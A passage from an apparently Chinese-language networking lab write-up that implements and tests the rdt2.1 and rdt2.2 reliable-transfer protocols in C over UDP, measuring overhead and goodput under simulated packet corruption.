class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">receiving_packets</span><span class="params">()</span>&#123;</span><br><span class="line">    Packet *rcvpkt;</span><br><span class="line">    Packet* sndpkt;</span><br><span class="line">    <span class="type">int</span> rcv_seq = <span class="number">-1</span>;</span><br><span class="line">    <span class="comment">// 初始化状态</span></span><br><span class="line">    Receiver_State currentState = STATE_WAIT_FOR_EVEN_FROM_BELOW; </span><br><span class="line">    <span class="keyword">while</span> (TRUE)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">switch</span> (currentState)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> STATE_WAIT_FOR_EVEN_FROM_BELOW:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;STATE_WAIT_FOR_EVEN_FROM_BELOW\n&quot;</span>);</span><br><span class="line">            rcvpkt = rdt_rcv(sockfd, &amp;server_addr);</span><br><span class="line">            <span class="keyword">if</span> (notcorrupt(rcvpkt) &amp;&amp; is_seq_even(rcvpkt))</span><br><span class="line">            &#123;</span><br><span class="line">                extract_data(rcvpkt);</span><br><span class="line">                rcv_seq = rcvpkt-&gt;seq;</span><br><span class="line">                sndpkt = make_pkt(rcv_seq, PACKET_TYPE_ACK, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">                udt_send(sockfd, sndpkt, &amp;server_addr);</span><br><span class="line">                <span class="built_in">free</span>(sndpkt);</span><br><span class="line">                currentState = STATE_WAIT_FOR_ODD_FROM_BELOW;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (corrupt(rcvpkt))</span><br><span class="line">            &#123;</span><br><span class="line">                sndpkt = make_pkt(rcv_seq, PACKET_TYPE_NAK, <span class="literal">NULL</span>);</span><br><span class="line">                udt_send(sockfd, sndpkt, &amp;server_addr);</span><br><span class="line">                <span class="built_in">free</span>(sndpkt);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (notcorrupt(rcvpkt) &amp;&amp; is_seq_odd(rcvpkt))</span><br><span class="line">            &#123;</span><br><span class="line">                sndpkt = make_pkt(rcv_seq, PACKET_TYPE_ACK, <span class="literal">NULL</span>);</span><br><span class="line">                udt_send(sockfd, sndpkt, &amp;server_addr);</span><br><span class="line">                <span class="built_in">free</span>(sndpkt);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> STATE_WAIT_FOR_ODD_FROM_BELOW:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;STATE_WAIT_FOR_ODD_FROM_BELOW\n&quot;</span>);</span><br><span class="line">            rcvpkt = rdt_rcv(sockfd, &amp;server_addr);</span><br><span class="line">            <span class="keyword">if</span> (notcorrupt(rcvpkt) &amp;&amp; is_seq_odd(rcvpkt))</span><br><span class="line">            &#123;</span><br><span class="line">                extract_data(rcvpkt);</span><br><span class="line">                rcv_seq = rcvpkt-&gt;seq;</span><br><span class="line">                sndpkt = make_pkt(rcv_seq, PACKET_TYPE_ACK, <span class="literal">NULL</span>);</span><br><span class="line">                udt_send(sockfd, sndpkt, &amp;server_addr);</span><br><span class="line">                <span class="built_in">free</span>(sndpkt);</span><br><span class="line">                currentState = STATE_WAIT_FOR_EVEN_FROM_BELOW;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (corrupt(rcvpkt))</span><br><span class="line">            &#123;</span><br><span class="line">                sndpkt = make_pkt(rcv_seq, PACKET_TYPE_NAK, <span class="literal">NULL</span>);</span><br><span class="line">                udt_send(sockfd, sndpkt, &amp;server_addr);</span><br><span class="line">                <span class="built_in">free</span>(sndpkt);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (notcorrupt(rcvpkt) &amp;&amp; is_seq_even(rcvpkt))</span><br><span class="line">            &#123;</span><br><span class="line">                sndpkt = make_pkt(rcv_seq, PACKET_TYPE_ACK, <span class="literal">NULL</span>);</span><br><span class="line">                udt_send(sockfd, sndpkt, &amp;server_addr);</span><br><span class="line">                <span class="built_in">free</span>(sndpkt);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">free</span>(rcvpkt);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="3-rdt2-1的测试"><a href="#3-rdt2-1的测试" class="headerlink" title="3) rdt2.1的测试"></a>3) rdt2.1的测试</h3><p>实验要求我们以 <strong>数据包错误频率(Tamper rate)</strong> 为自变量，改变其值</p><p>观察 <strong>数据包总数(OverHead)</strong> 和 <strong>有效吞吐量(Goodput)</strong> 这两个因变量与之的关系</p><blockquote><p>数据包总数（OverHead）= 发送端总发包量 + 接收端总发包量，即包括正常数据包、ACK/NAK包、重传包；</p><p>有效吞吐量（Goodput） = 有效数据包数量 × 数据包大小 ÷ 数据发送总时间，其中有效数据包不包括ACK/NAK和重传包；</p></blockquote><p>为了统计<strong>数据包总数</strong>，我们在库文件中引入静态变量：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">long</span> OverHead = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><br>在每次发送数据包，即调用udt_send时，将该变量+1：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">udt_send</span><span class="params">(SOCKET sockfd, Packet *packet, <span class="keyword">struct</span> sockaddr_in *addr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *buffer = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Packet));</span><br><span class="line">    <span class="built_in">memcpy</span>(buffer, packet, <span class="keyword">sizeof</span>(Packet));</span><br><span class="line">    <span class="comment">// 发送通知</span></span><br><span class="line">    <span class="keyword">if</span> (sendto(sockfd, buffer, <span class="keyword">sizeof</span>(Packet), <span class="number">0</span>, (<span class="keyword">struct</span> sockaddr *)addr, <span class="keyword">sizeof</span>(*addr)) == SOCKET_ERROR)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Error code : %d\n&quot;</span>, WSAGetLastError());</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Sendto failed.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Sent successfully. Sequence: %d; Type:%d.\n&quot;</span>, packet-&gt;seq, packet-&gt;type);</span><br><span class="line">        OverHead++; <span class="comment">// 统计OverHead</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(buffer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>提供获取OverHead的函数：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">getOverHead</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;OverHead: %d\n&quot;</span>, OverHead);</span><br><span class="line">    <span class="keyword">return</span> OverHead;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们以相同的手段统计数据包损坏数，并计算<strong>数据包错误频率</strong>：</p><p>数据包错误频率 = 数据包损坏数 / 数据包总数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">long</span> corruptNum = <span class="number">0</span>;</span><br><span class="line">boolean <span class="title function_">corrupt</span><span class="params">(Packet *rcvpkt)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (rcvpkt-&gt;checksum != calculate_checksum(rcvpkt))</span><br><span class="line">    &#123;</span><br><span class="line">        corruptNum++;   <span class="comment">// 统计数据包损坏数</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Packet corrupted!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">float</span> <span class="title function_">calculate_tamper_rate</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">float</span> tamper_rate = corruptNum * <span class="number">1.0</span> / OverHead;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Tamper Rate: %f\n&quot;</span>, tamper_rate);</span><br><span class="line">    <span class="keyword">return</span> tamper_rate;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而对于<strong>有效吞吐量</strong>，库文件中已经有提供函数给我们直接获取，需要我们传入程序运行的始末时间：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">float</span> <span class="title function_">calculate_goodput</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> start_time, <span class="type">unsigned</span> <span class="type">long</span> end_time)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> total_bytes_received = MAX_PACKET_SIZE * TOTAL_PACKETS;              <span class="comment">// 接收到的总字节数</span></span><br><span class="line">    <span class="type">float</span> goodput = (<span class="type">float</span>)total_bytes_received / (<span class="type">float</span>)(end_time - start_time) * <span class="number">1000.0f</span>; <span class="comment">// bytes per second</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Total time elapsed: %lu ms\n&quot;</span>, (end_time - start_time));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Goodput: %f B/s\n&quot;</span>, goodput);</span><br><span class="line">    <span class="keyword">return</span> goodput;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在server.c中调用以上函数如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">// get start_time</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> start_time = GetTickCount();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (!finish_send)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/**状态机**/</span> </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// get end_time</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> end_time = GetTickCount();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// calculate goodput</span></span><br><span class="line">    calculate_goodput(start_time, end_time);</span><br><span class="line">    <span class="comment">// get overhead</span></span><br><span class="line">    getOverHead();</span><br><span class="line">    <span class="comment">// get tamper rate</span></span><br><span class="line">    calculate_tamper_rate();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>由于默认的数据包数量是200，在该条件下，前后间隔时间太短接近于0，会导致计算吞吐量得到无穷大。因此在rdt.h中修改数据包数为20000：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> TOTAL_PACKETS 20000</span></span><br></pre></td></tr></table></figure></p><p>先运行接收端再运行客户端，分别将输出内容重定向到文本文件中：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@Andrew:/mnt/d/.c/computernetwork/exp3-1# ./client.exe &gt;client.txt</span><br></pre></td></tr></table></figure><br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@Andrew:/mnt/d/.c/computernetwork/exp3-1# ./server.exe &gt; server.txt</span><br></pre></td></tr></table></figure></p><p>在clumsy中设定Tamper = 0.3，测试结果如下：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Total time elapsed: 1531 ms</span><br><span class="line">Goodput: 13376878.000000 B/s</span><br><span class="line">OverHead: 20105</span><br><span class="line">Tamper Rate: 0.002835</span><br></pre></td></tr></table></figure><p>修改Tamper的值依次为0.3, 0.5, 1, 2, 3, 5, 10, 20, 30，统计汇总到excel表格中，并绘制曲线如下：</p><p><img src="/img/2024/05/exp3/0.png" alt="image.png"></p><p><img src="/img/2024/05/exp3/1.png" alt="image.png"></p><p>根据图像可以看出，数据包总数 与 数据包错误频率 之间有呈非线性关系的趋势，而有效吞吐量 与 数据包错误频率 之间呈线性关系</p><h1 id="二、实现rdt2-2"><a href="#二、实现rdt2-2" class="headerlink" title="二、实现rdt2.2"></a>二、实现rdt2.2</h1><h2 id="1-理解rdt2-2"><a href="#1-理解rdt2-2" class="headerlink" title="1. 理解rdt2.2"></a>1. 理解rdt2.2</h2><p>想要理解为什么引入rdt2.2，还是得看rdt2.1在哪种场景下会比较低效：</p><p>假设连续三个数据包满足以下条件：接收端正常接收数据包，接收端返回的ACK发生错误，发送端重传的数据包发生错误</p><p>如果是rdt2.1，之后会发生：接收端返回一个NAK，之后发送端再重传一个数据包</p><p>可以发现，在上述场景中，发送端重传的数据包无论是否发生错误，对接收端来说都是没有用的。而如果该数据包损坏，接收端就得返回一个NAK，导致发送端不得不再重传一次没有用的数据包</p><p>于是rdt2.2引入一种解决方案：</p><p><strong>不使用NAK，而是将ACK编号</strong>：接收端只有在接收到当前期待的数据包（比如数据包0）时，才会返回该序号的ACK（比如ACK0），其他情况（接收到数据包1 或 接收到受损的数据包）都会返回另一序号的ACK（比如ACK1）</p><p>因此，rdt2.2的状态机如下：</p><p><strong>发送端</strong></p><div class="mermaid-wrap"><pre class="mermaid-src" hidden>  stateDiagram   state &quot;Wait for call 0 from above&quot; as st1   state &quot;Wait for ACK 0&quot; as st2   state &quot;Wait for call 1 from above&quot; as st3   state &quot;Wait for ACK 1&quot; as st4   [*] --&gt; st1   st1 --&gt; st2: rdt_send(data) &lt;br&gt;  sndpkt&#x3D;make_pkt(0, data, checksum) udt_send(sndpkt)   st2 --&gt; st2: rdt_rcv(rcvpkt) &amp;&amp; (corrupt(rcvpkt) || isACK(rcvpkt, 1)) &lt;br&gt; udt_send(sndpkt)   st2 --&gt; st3: rdt_rcv(rcvpkt) &amp;&amp; notcorrupt(rcvpkt) &amp;&amp; isACK(rcvpkt, 0) &lt;br&gt;     st3 --&gt; st4: rdt_send(data) &lt;br&gt;  sndpkt&#x3D;make_pkt(1, data, checksum) udt_send(sndpkt)   st4 --&gt; st4: rdt_rcv(rcvpkt) &amp;&amp; (corrupt(rcvpkt) || isACK(rcvpkt, 0))  &lt;br&gt; udt_send(sndpkt)   st4 --&gt; st1: rdt_rcv(rcvpkt) &amp;&amp; notcorrupt(rcvpkt) &amp;&amp; isACK(rcvpkt, 1) &lt;br&gt;    </pre></div><p>相比rdt2.1，rdt2.2检查ACK的函数多了一个参数，值为0/1，用于判断ACK的序号的奇偶性；并将isNAK替换为当前期待ACK序号奇偶性相反的isACK，比如，在状态Wait for ACK 0:</p><p>isACK(rcvpkt) 变为 isACK(rcvpkt, 0)<br>isNAK(rcvpkt) 变为 isACK(rcvpkt, 1)</p><p><strong>接收端</strong></p><div class="mermaid-wrap"><pre class="mermaid-src" hidden>  stateDiagram   direction LR   state &quot;Wait for 0 call from below&quot; as st1   state &quot;Wait for 1 call from below&quot; as st2   [*] --&gt; st1   st1 --&gt; st1: rdt_rcv(rcvpkt) &amp;&amp; (corrupt(rcvpkt) || has_seq1(rcvpkt)) &lt;br&gt; sndpkt&#x3D;make_pkt(ACK, 1, checksum) udt_send(sndpkt)   st1 --&gt; st2: rdt_rcv(rcvpkt) &amp;&amp; notcorrupt(rcvpkt) &amp;&amp; has_seq0(rcvpkt) &lt;br&gt; extract(packet, data) deliver_data(data) &lt;br&gt; sndpkt&#x3D;make_pkt(ACK, 0, checksum) udt_send(sndpkt)   st2 --&gt; st2: rdt_rcv(rcvpkt) &amp;&amp; (corrupt(rcvpkt) || has_seq0(rcvpkt)) &lt;br&gt; sndpkt&#x3D;make_pkt(ACK, 0, checksum) udt_send(sndpkt)   st2 --&gt; st1: rdt_rcv(rcvpkt) &amp;&amp; notcorrupt(rcvpkt) &amp;&amp; has_seq1(rcvpkt) &lt;br&gt; extract(packet, data) deliver_data(data) &lt;br&gt;  sndpkt&#x3D;make_pkt(ACK, 1, checksum) udt_send(sndpkt)  </pre></div><p>相比rdt2.1，rdt2.2在状态Wait for 0 call from below时，将corrupt(rcvpkt) 和 notcorrupt(rcvpkt) &amp;&amp; has_seq1(rcvpkt)合并为一种情况：</p><p>corrupt(rcvpkt) || has_seq1(rcvpkt)</p><p>并统一发送ACK1（make_pkt构造ACK数据包也增加了一个序号参数）：</p><p>make_pkt(ACK, 1, checksum)</p><p>否则（正常接收到数据包0）发送ACK0：</p><p>make_pkt(ACK, 0, checksum)</p><h2 id="2-rdt2-2代码实现"><a href="#2-rdt2-2代码实现" class="headerlink" title="2. rdt2.2代码实现"></a>2. rdt2.2代码实现</h2><p>由于rdt2.2不需要NAK，并且将ACK编号为ACK0和ACK1</p><p>在库文件中将数据包类型（包括ACK, DATA, NAK）修改为（ACK0, DATA, ACK1），如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 数据包定义</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">// rdt 2.1</span></span><br><span class="line">    <span class="comment">// PACKET_TYPE_ACK = 1,</span></span><br><span class="line">    <span class="comment">// PACKET_TYPE_DATA = 0,</span></span><br><span class="line">    <span class="comment">// PACKET_TYPE_NAK = -1</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// rdt 2.2</span></span><br><span class="line">    PACKET_TYPE_ACK_ODD = <span class="number">1</span>,</span><br><span class="line">    PACKET_TYPE_DATA = <span class="number">0</span>,</span><br><span class="line">    PACKET_TYPE_ACK_EVEN = <span class="number">-1</span></span><br><span class="line">&#125; Packet_Type;</span><br></pre></td></tr></table></figure><p>那么就不需要原本的isACK以及isNAK，将其注释并引入isACKEven和isACKOdd判断数据包类型：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// rdt v2.1</span></span><br><span class="line"><span class="comment">// boolean isACK(Packet *rcvpkt)</span></span><br><span class="line"><span class="comment">// &#123;</span></span><br><span class="line"><span class="comment">//     if (rcvpkt-&gt;type == PACKET_TYPE_ACK)</span></span><br><span class="line"><span class="comment">//     &#123;</span></span><br><span class="line"><span class="comment">//         printf(&quot;Received ACK of %d\n&quot;, rcvpkt-&gt;seq);</span></span><br><span class="line"><span class="comment">//         return TRUE;</span></span><br><span class="line"><span class="comment">//     &#125;</span></span><br><span class="line"><span class="comment">//     return FALSE;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="comment">// boolean isNAK(Packet *rcvpkt)</span></span><br><span class="line"><span class="comment">// &#123;</span></span><br><span class="line"><span class="comment">//     if (rcvpkt-&gt;type == PACKET_TYPE_NAK)</span></span><br><span class="line"><span class="comment">//     &#123;</span></span><br><span class="line"><span class="comment">//         printf(&quot;Received NAK of %d\n&quot;, rcvpkt-&gt;seq);</span></span><br><span class="line"><span class="comment">//         return TRUE;</span></span><br><span class="line"><span class="comment">//     &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//     return FALSE;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// rdt v2.2</span></span><br><span class="line">boolean <span class="title function_">isACKOdd</span><span class="params">(Packet *rcvpkt)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (rcvpkt-&gt;type == PACKET_TYPE_ACK_ODD)  <span class="comment">// key step</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Received ACK ODD of %d\n&quot;</span>, rcvpkt-&gt;seq);</span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">boolean <span class="title function_">isACKEven</span><span class="params">(Packet *rcvpkt)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (rcvpkt-&gt;type == PACKET_TYPE_ACK_EVEN)  <span class="comment">// key step</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Received ACK EVEN of %d\n&quot;</span>, rcvpkt-&gt;seq);</span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于<strong>发送端</strong>，将状态 <strong>STATE_WAIT_ACK_NAK_EVEN</strong> 和 <strong>STATE_WAIT_ACK_NAK_ODD</strong> 修改为 <strong>STATE_WAIT_ACK_EVEN</strong> 和 <strong>STATE_WAIT_ACK_ODD</strong>，根据状态机模型合并两个分支（以下key step）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (currentState)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> STATE_WAIT_FOR_CALL_EVEN_FROM_ABOVE:</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;STATE_WAIT_FOR_CALL_EVEN_FROM_ABOVE\n&quot;</span>);</span><br><span class="line">    data = rdt_send(seq);</span><br><span class="line">    sndpkt = make_pkt(seq, PACKET_TYPE_DATA, data);</span><br><span class="line">    udt_send(sockfd, sndpkt, &amp;client_addr);</span><br><span class="line">    seq++;</span><br><span class="line">    <span class="comment">// rdt v2.1:</span></span><br><span class="line">    <span class="comment">// currentState = STATE_WAIT_ACK_NAK_EVEN;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// rdt v2.2:</span></span><br><span class="line">    currentState = STATE_WAIT_ACK_EVEN;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// rdt v2.1:</span></span><br><span class="line"><span class="comment">// case STATE_WAIT_ACK_NAK_EVEN:</span></span><br><span class="line"><span class="comment">//     printf(&quot;STATE_WAIT_ACK_NAK_EVEN\n&quot;);</span></span><br><span class="line"><span class="comment">//     rcvpkt = rdt_rcv(sockfd, &amp;client_addr);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//     if (corrupt(rcvpkt) || isNAK(rcvpkt))</span></span><br><span class="line"><span class="comment">//     &#123;</span></span><br><span class="line"><span class="comment">//         udt_send(sockfd, sndpkt, &amp;client_addr);</span></span><br><span class="line"><span class="comment">//     &#125;</span></span><br><span class="line"><span class="comment">//     else if (notcorrupt(rcvpkt) &amp;&amp; isACK(rcvpkt))</span></span><br><span class="line"><span class="comment">//     &#123;</span></span><br><span class="line"><span class="comment">//         free(sndpkt);</span></span><br><span class="line"><span class="comment">//         currentState = STATE_WAIT_FOR_CALL_ODD_FROM_ABOVE;</span></span><br><span class="line"><span class="comment">//     &#125;</span></span><br><span class="line"><span class="comment">//     free(rcvpkt);</span></span><br><span class="line"><span class="comment">//     break;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// rdt v2.2:</span></span><br><span class="line"><span class="keyword">case</span> 